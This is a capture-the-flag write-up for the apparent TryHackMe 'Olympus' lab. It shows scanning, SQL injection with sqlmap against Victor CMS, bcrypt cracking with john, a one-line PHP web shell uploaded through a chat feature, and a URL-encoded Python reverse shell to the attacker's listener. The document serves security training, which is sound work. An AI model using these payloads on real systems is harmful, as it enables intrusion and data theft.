# THM-Olympus-CTF
# Port Scanning
As you can see from the Nmap scan, port 22 ssh and port 80 are open. And port 80 redirects us to http://olympus.thm 

```bash
root@ip-10-10-230-85:~# rustscan -a 10.10.182.192 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time \u231b

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.182.192:22
Open 10.10.182.192:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Add the domain name olympus to your hosts file
```bash
echo "10.10.27.68 olympus.thm" >> /etc/hosts
```
Et voilà !  We have acces to the web site.Unfortunately, we are greeted with a message saying that this site is still under construction...

![image](https://user-images.githubusercontent.com/90036439/223972505-ab22dc4d-99b4-4295-96e5-7d3ec9145d5a.png)

# Ennumeration
Let's start by seeing if we can discover some interesting files 

```bash
root@ip-10-10-70-200:~# ffuf -u http://olympus.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://olympus.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 1948, Words: 238, Lines: 48]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10]
~webmaster              [Status: 301, Size: 315, Words: 20, Lines: 10]
:: Progress: [4655/4655] :: Job [1/1] :: 33790 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
Bingo ! We have ~webmaster

![image](https://user-images.githubusercontent.com/90036439/223973205-ac9467ee-8ca2-43be-906c-0b69d4c14fcf.png)

While messing around on the site I was able to trigger an SQL error on the "search" parameter. By doing some deep research, I saw that Victor CMS was vulnerable to SQL injections.
https://www.exploit-db.com/exploits/48734

![image](https://user-images.githubusercontent.com/90036439/223974836-e8de8d9a-c3f8-43d0-91da-08e3753e8d06.png)

I saved the querry via burpsuit and send it to sqlmap. I was able to recover all the databases on the server. But only Olympus interests me.
So I dump all the data from the Olympus

```bash
root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dbs

[...]

[09:17:14] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus
```
![image](https://user-images.githubusercontent.com/90036439/223977555-baf68ac5-5e32-4d50-b2c7-c0ea7013e61a.png)

Now that we have hashes we can try to crack some user password. First i tried promotheus.
After a while I got a password
```bash
root@ip-10-10-70-200:~# john promotheus.hash -w=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s[.........]e       (?)
1g 0:00:06:29 DONE (2023-03-09 09:30) 0.002569g/s 10.31p/s 10.31c/s 10.31C/s 19861986..543210
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Exploring the database i found a table called chats. 

```Database: olympus
Table: chats
[3 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+


```

![image](https://user-images.githubusercontent.com/90036439/223977977-be6d630d-dd90-4e56-80cf-56c1de2884c3.png)

![image](https://user-images.githubusercontent.com/90036439/223983373-552684f7-5e73-4b54-ba76-ff0d0c38858a.png)

![image](https://user-images.githubusercontent.com/90036439/223985036-95de1514-234a-4bfb-8717-edfccd387bd5.png)

Let's put together what we know. The IT guy made sure that the files that are sent to the server via chat have a random name. We also know that all messages are stored in the database including the files we send. We can make a php file containing a reverse shell or one that executes commands on the server. Upload it to the server via the chat. Dump the database and get its name

```bash
root@ip-10-10-70-200:~# cat totalyNotEvileFile.php 
<?php system($_GET["cmd"]); ?>
root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus -T chats --fresh-queries 
```
![image](https://user-images.githubusercontent.com/90036439/223987707-10423bfa-ffa9-4365-9aff-9e3763597f1d.png)

```bash
root@ip-10-10-70-200:~# ffuf -u http://chat.olympus.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://chat.olympus.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 281, Words: 20, Lines: 10]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
javascript              [Status: 301, Size: 325, Words: 20, Lines: 10]
phpmyadmin              [Status: 403, Size: 281, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10]
static                  [Status: 301, Size: 321, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 322, Words: 20, Lines: 10]
:: Progress: [4655/4655] :: Job [1/1] :: 11317 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
![image](https://user-images.githubusercontent.com/90036439/223988276-0a0779ab-2cfd-4b1e-a09f-c56f732dd54c.png)

```
curl http://chat.olympus.thm/uploads/32c800549703817361ff290d8b2bfc9a.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.10.70.200%22%2C9001%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%20f%20in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
```

```bash
root@ip-10-10-70-200:~# nc -lvnp 9001
Listening on [0.0.0.0] (family 0, port 9001)
Connection from 10.10.27.68 35650 received!
www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")';export TERM=xterm
<mport pty;pty.spawn("/bin/bash")';export TERM=xterm            
www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ ^Z
[1]+  Stopped                 nc -lvnp 9001
root@ip-10-10-70-200:~# stty raw -echo;fg
nc -lvnp 9001

www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ 
```

```bash
www-data@olympus:/var/www/html/chat.olympus.thm$ find / -type f -perm -4000 2>/dev/null | grep -v /snap*
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/cputils
/usr/bin/sudo
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/newgrp

```
